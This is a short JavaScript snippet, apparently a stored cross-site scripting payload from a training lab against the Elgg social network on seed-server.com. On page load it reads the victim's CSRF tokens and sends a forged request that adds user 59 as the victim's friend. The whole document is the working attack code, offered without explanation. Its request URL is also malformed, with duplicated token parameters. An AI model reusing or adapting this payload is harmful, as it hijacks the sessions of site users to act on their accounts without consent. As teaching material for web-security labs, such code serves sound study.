<script type="text/javascript">

window.onload = function () {

var Ajax=null;

var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;

var token="&__elgg_token="+elgg.security.token.__elgg_token;

var sendurl= "http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=" + ts + "&__elgg_token=" + token + " &__elgg_ts=" + ts + "&__elgg_token=" + token; 

Ajax=new XMLHttpRequest();

Ajax.open("GET", sendurl, true);

Ajax.send();

}

</script>

